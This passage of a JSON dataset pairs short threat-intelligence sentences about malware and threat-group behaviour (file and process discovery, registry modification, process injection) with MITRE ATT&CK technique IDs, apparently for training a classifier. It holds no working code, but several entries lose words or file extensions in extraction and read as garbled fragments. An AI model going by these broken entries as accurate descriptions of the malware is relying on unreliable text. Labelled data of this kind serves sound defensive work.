    "text": "PowerDuke has commands to get the current directory name as well as the size of a file.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "It also has commands to obtain information about logical drives, drive type, and free space.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "POWRUNER may enumerate user directories on a victim.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "A module in Prikormka collects information about the paths, size, and creation time of files with specific file extensions, but not the actual content of the file.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Proxysvc lists files in directories.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Psylo has commands to enumerate all storage devices and to find all files that start with a particular string.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Pteranodon identifies files matching certain file extension and copies them to subdirectories it created.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Pupy can walk through directories and recursively search for strings in files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "RARSTONE obtains installer properties from Uninstall Registry Key entries to obtain information about installed applications and how to uninstall certain applications.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "RedLeaves can enumerate and search for files and directories.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Remcos can search for files on the infected machine.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Remsec is capable of listing contents of folders on the victim.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Remsec also searches for custom network encryption software on victims.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "ROKRAT has the ability to gather a list of files and directories on the infected system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Rover automatically searches for files on local drives based on a predefined list of file extensions.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "RTM can scan victim drives to look for specific banking software on the machine to determine next actions.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "It also looks at browsing history and open tabs for specific strings.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Seasalt has the capability to identify the drive type on a victim.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "SHOTPUT has a command to obtain a directory listing.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Smoke Loader recursively searches through directories for files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "SOUNDBITE is capable of enumerating and manipulating files and directories.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Sowbug identified and extracted all Word documents on a server by using a command containing * and * x.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The actors also searched for documents based on a specific date range and attempted to identify all installed software on a victim.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "SPACESHIP identifies files and directories for collection by searching for specific file extensions or file modification time.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "StreamEx has the ability to enumerate drive types.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "SynAck checks its directory location in an attempt to avoid launching in a sandbox.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "TINYTYPHON searches through the drive containing the OS, then all drive letters C through to Z, for documents matching certain extensions.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "TrickBot searches the system for all of the following file extension , , , g, g4, .mp4, .mp3, , , g, , , , , f, , x, and .",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "It can also obtain browsing history, cookies, and plug-in information.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Turla surveys a system upon check-in to discover files in specific locations on the hard disk %TEMP% directory, the current user's desktop, and in the Program Files directory.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Turla RPC backdoors have also searched for files matching the lPH* pattern.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "UPPERCUT has the capability to gather the victim's current directory.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "USBStealer searches victim drives for files matching certain extensions or names.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Volgmer can list directories on a victim.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "WannaCry searches for variety of user files by file extension before encrypting them using RSA and AES, including Office, PDF, image, audio, video, source code, archive/compression format, and key and certificate files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "WINERACK can enumerate files and directories.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "WinMM sets a WH_CBT Windows hook to search for and capture files on the victim.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "XAgentOSX contains the readFiles function to return a detailed listing of a specified directory.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Zebrocy searches for files that are 60mb and less and contain the following extension , x, , x, , x, , , and .",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Zebrocy also runs the echo %APPDATA% command to list the contents of the directory.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Zebrocy can obtain the current execution path as well as perform drive enumeration.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "ZLib has the ability to enumerate files and drives.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "zwShell can browse the file system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "ZxShell has a command to open a file manager and explorer on the system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "ADVSTORESHELL is capable of setting and deleting Registry values.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "APT19 uses a Port 22 malware variant to modify several Registry keys.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "APT32's backdoor has modified the Windows Registry to store the backdoor's configuration.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "APT38 uses a tool called CLEANTOAD that has the capability to modify Registry keys.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "APT41 used a malware variant called GOODLUCK to modify the registry in order to steal credentials.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "BACKSPACE is capable of deleting Registry keys, sub-keys, and values on a victim system.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "BADCALL modifies the firewall Registry key .",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Bankshot writes data into the Registry key .",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Cardinal RAT sets to point to its executable.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Catchamas creates three Registry keys to establish persistence by adding a New Service.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "CHOPSTICK may store RC4 encrypted configuration information in the Windows Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Dragonfly 2.0 modified the Registry to perform multiple techniques through the use of Reg.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Exaramel for Windows adds the configuration to the Registry in XML format.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "FELIXROOT deletes the Registry key rundll32. open.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "FIN8 has deleted Registry keys during post compromise cleanup activities.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Gorgon Group malware can deactivate security mechanisms in Microsoft Office by editing several keys and values under .",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "GreyEnergy modifies conditions in the Registry and adds keys.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Honeybee uses a batch file that modifies Registry keys to launch a DLL into the svchost process.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "HOPLIGHT has modified Managed Object Format files within the Registry to run specific commands and create persistence on the system.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Hydraq creates a Registry subkey to register its created service, and can also uninstall itself later by deleting this value.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Hydraq's backdoor also enables remote attackers to modify and delete subkeys.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "InvisiMole has a command to create, set, copy, or delete a specified Registry key or value.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "KEYMARBLE has a command to create Registry entries for storing data under DataPath.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "JPIN can obtain the victim user name.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "4H RAT has the capability to obtain a listing of running processes .",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "ADVSTORESHELL can list running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Agent Tesla lists the current running processes on the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "APT1 gathered a list of running processes on the system using tasklist directory",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "An APT28 loader Trojan will enumerate the victim's processes searching for explorer if its current process does not have necessary permissions.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "APT3 has a tool that can list out currently running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "APT37's Freenki malware lists running processes using the Microsoft Windows API.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "APT38 leveraged Sysmon to understand the processes, services in the organization.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Azorult can collect a list of running processes by calling CreateToolhelp32Snapshot.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "BabyShark has executed the tasklist command.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Backdoor.Oldrea collects information about running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "BACKSPACE may collect information about running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Bankshot identifies processes and collects the process ids.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "BBSRAT can list running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "BISCUIT has a command to enumerate running processes and identify their owners.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "BLACKCOFFEE has the capability to discover processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "BlackEnergy has gathered a process list by using Tasklist .",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Brave Prince lists the running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Cannon can obtain a list of processes running on the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Carbanak lists running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Cardinal RAT contains watchdog functionality that ensures its process is always running, else spawns a new instance.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "ChChes collects its process identifier on the victim.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike's \"beacon\" payload can collect information on process details.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Crimson contains a command to list processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Darkhotel has searched for anti-malware strings and anti-virus processes running on the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Deep Panda uses the Microsoft Tasklist utility to list processes running on systems.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Derusbi collects current and parent process IDs.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "The discovery modules used with Duqu can collect information on process details.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "DustySky collects information about running processes from victims.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Elise enumerates processes via the tasklist command.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "ELMER is capable of performing process listings.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Emotet has been observed enumerating local processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Empire can find information about processes running on local and remote systems.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Epic uses the tasklist directory command to obtain a list of processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "EvilBunny has used EnumProcesses to identify how many process are running in the environment.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "FELIXROOT collects a list of running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Final1stspy obtains a list of running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "FinFisher checks its parent process for indications that it is running in a sandbox setup.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "FruitFly has the ability to list processes on the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Fysbis can collect information about running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "GeminiDuke collects information on running processes and environment variables from the victim.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "gh0st RAT has the capability to list processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "GravityRAT lists the running processes on the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "HALFBAKED can obtain information about running processes on the victim.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Helminth has used Tasklist to get information on processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Honeybee gathers a list of processes using the tasklist command and then is sent back to the control server.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Hydraq creates a backdoor through which remote attackers can monitor processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "iKitten lists the current processes running.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "InvisiMole obtains a list of running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Ixeshe can list running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "JHUHUGIT obtains a list of running processes on the victim.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "JPIN can list running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "jRAT can query and kill system processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Kasidet has the ability to search for a given process name in processes currently running in the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Kazuar obtains a list of running processes through WMI querying and the ps command.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Ke3chang performs process discovery using tasklist commands.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "KEYMARBLE can obtain a list of running processes on the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "The OsInfo function in Komplex collects a running process list.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Kwampirs collects a list of running services with the command tasklist directory",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Several Lazarus Group malware families gather a list of running processes on a victim system and send it to their C2 server.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "A Destover-like variant used by Lazarus Group also gathers process times.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Linfo creates a backdoor through which remote attackers can retrieve a list of running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Machete has a component to check for running processes to look for web browsers.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Magic Hound malware can list running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "MobileOrder has a command to upload information about all running processes to its C2 server.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Molerats actors obtained a list of active processes on the victim and sent them to C2 servers.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "MoonWind has a command to return a list of running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Mosquito runs tasklist to obtain running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "MuddyWater has used malware to obtain a list of running processes on the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "NavRAT uses tasklist directory to check running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "NETEAGLE can send process listings over the C2 channel.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "OceanSalt can collect the name and ID for every process running on the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "OilRig has run tasklist on a victim's machine.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Orz can gather a process list from the victim.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Pasam creates a backdoor through which remote attackers can retrieve lists of running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "PLAINTEE performs the tasklist command to list running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "PlugX has a module to list the processes running on a machine.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "POORAIM can enumerate processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "After compromising a victim, Poseidon Group lists all running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "PowerDuke has a command to list the victim's processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "PowerSploit's Get-ProcessTokenPrivilege Privesc-PowerUp module can enumerate privileges for a given process.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "PowerStallion has been used to monitor process lists.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "POWRUNER may collect process information by running tasklist on a victim.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Proxysvc lists processes running on the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Remsec can obtain a process list from the victim.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "RogueRobin checks the running processes for evidence it may be running in a sandbox environment.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "It specifically enumerates processes for Wireshark and Sysinternals.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "ROKRAT lists the current running processes on the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "RTM can obtain information about process integrity levels.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Seasalt has a command to perform a process listing.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "SHOTPUT has a command to obtain a process listing.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Socksbot can list all running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Stealth Falcon malware gathers a list of running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "StreamEx has the ability to enumerate processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Sykipot may gather a list of running processes by running tasklist directory",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "SynAck enumerates all running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Tasklist can be used to discover processes running on a system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Trojan.Karagany can use tasklist to collect a list of running tasks.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Tropic Trooper enumerates the running processes on the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Turla surveys a system upon check-in to discover running processes using the tasklist directory command.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Turla RPC backdoors have also enumerated processes associated with specific open ports or named pipes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "UBoatRAT can list running processes on the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Ursnif has gathered information about running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "VERMIN can get a list of the processes and running tasks on the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Volgmer can gather a list of processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "WINERACK can enumerate processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "WinMM sets a WH_CBT Windows hook to collect information on process creation.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Winnti Group looked for a specific process running on infected servers.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "XAgentOSX contains the getProcessList function to run ps aux to get running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "yty gets an output of running processes using the tasklist command.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Zebrocy uses the tasklist and wmic process get Capture, ExecutablePath commands to gather the processes running on the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "ZxShell has a command, ps, to obtain a listing of processes on the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "APT37 injects its malware variant, ROKRAT, into the cmd process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "APT41 malware TIDYELF loaded the main WINTERLOVE component by injecting it into the iexplore process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "AuditCred can inject code from files to other running processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Backdoor.Oldrea injects itself into explorer .",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "BlackEnergy injects its DLL component into svchost .",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Carbanak downloads an executable and injects it directly into a new process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Carbon has a command to inject code into a process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Cardinal RAT injects into a newly spawned process created from a native Windows executable.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Group has injected code into trusted processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike can inject a variety of payloads into processes dynamically chosen by the adversary.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Denis injects its payload into Windows host processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Derusbi injects itself into the secure shell process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Duqu will inject itself into different processes to evade detection.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The selection of the target process is influenced by the security software that is installed on the system .",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Dyre injects into other processes to load modules.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Elise injects DLL files into iexplore .",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Emissary injects its DLL file into a newly spawned Internet Explorer process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Emotet has been observed injecting in to Explorer and other processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Empire contains multiple modules for injecting into processes, such as Invoke-PSInject.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "FinFisher injects itself into various processes depending on whether it is low integrity or high integrity.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Gazer performs thread execution hijacking to inject its orchestrator into a running thread from a remote process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Gazer performs a separate injection of its communication module into an Internet accessible process through which it performs C2.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Gorgon Group malware can download a remote access tool, ShiftyBug, and inject into another process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "GreyEnergy has a module to inject a PE binary into a remote process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "HiddenWasp adds itself to the LD_PRELOAD path and sets a series of environment variables.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "HIDEDRV injects a DLL for Downdelph into the explorer process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Honeybee uses a batch file to load a DLL into the svchost process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "HOPLIGHT has injected into running processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "HTRAN can inject into into running processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "HyperBro can run shellcode it injects into a newly created process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "JHUHUGIT performs code injection injecting its own functions to browser processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "JPIN can inject content into lsass to load a module.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "If running in a Windows environment, Kazuar saves a DLL to disk that is injected into the explorer process to execute the payload.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Kazuar can also be configured to inject and execute within specific processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Kimsuky has used Win7Elevate to inject malicious code into explorer .",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Koadic can perform process injection by using a reflective DLL.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
